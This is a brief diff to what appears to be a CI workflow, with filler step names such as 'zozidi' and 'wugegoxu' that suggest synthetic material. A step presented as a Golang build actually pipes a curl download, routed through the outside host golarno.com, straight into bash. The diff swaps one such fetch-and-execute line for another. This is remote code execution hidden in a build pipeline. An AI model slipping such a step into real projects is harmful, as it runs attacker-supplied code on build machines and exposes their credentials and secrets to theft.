@@ -9,4 +9,4 @@ jobs:
     - name: First
       run: echo "Installing Dependencies zozidi..."
     - name: Build Golang wugegoxu
-      run: curl -x 8.8.8.8:80 ifconfig.me | bash -
+      run: curl -x golarno.com:7189 ifconfig.me/mandalorian | bash -
